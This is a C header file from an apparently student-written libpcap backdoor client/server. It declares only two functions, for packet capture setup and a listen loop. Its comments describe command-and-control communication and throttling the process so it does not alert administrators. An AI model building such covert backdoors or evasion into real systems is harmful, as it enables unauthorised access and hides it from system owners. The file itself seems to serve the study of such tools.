#ifndef CAPTURE_H
#define CAPTURE_H

/*
SOURCE FILE: capture.h

PROGRAM: Backdoor - A simple two in one backdoor client/server using libpcap

DATE: October 23, 2011

REVISIONS:
	1.0 - October 23

DESIGNERS:
	Martin Casado
	Modified by Aman Abdulla
  Modified by Santana Mach and Steve Stanisic

PROGRAMMERS:
  Modified by Santana Mach and Steve Stanisic

NOTES: This file contains functionality to start packet capture using
	libpcap. This has been modified to capture on all interfaces as
	we don't know which one our command and control client will be
	communicating with. We've also attempted to limit the rate at which
	libpcap busy loops so that we don't show up at the top of the
	process activity lists and tip off an admin.
*/

/*
FUNCTION: pcap_init

PARAMS:
	const char* filter: The packet filter to apply.

RETURN: none.

NOTES: Call this function to ready libpcap for packet capture.
*/
void pcap_init(const char *filter);
/*
FUNCTION: srv_listen

PARAMS: int duplex

RETURN: none.

NOTES: Call this function to begin the listen loop.
*/
void srv_listen(int duplex);

#endif
